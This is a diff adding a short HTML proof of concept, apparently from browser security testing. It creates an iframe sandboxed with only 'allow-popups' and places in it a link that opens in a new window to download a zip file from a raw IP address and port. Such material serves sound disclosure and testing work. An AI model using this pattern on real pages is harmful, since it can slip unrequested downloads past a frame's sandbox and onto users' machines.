@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sandboxed Iframe PoC</title>
+</head>
+<body>
+    <script>
+        // Create a sandboxed iframe with allow-popups permission
+        let f = document.createElement('iframe');
+        f.sandbox = 'allow-popups';
+        f.srcdoc = '<a target="_blank" href="http:// 216.180.117.8:8001/download.zip">Click me</a>';
+        document.body.appendChild(f);
+    </script>
+</body>
+</html>
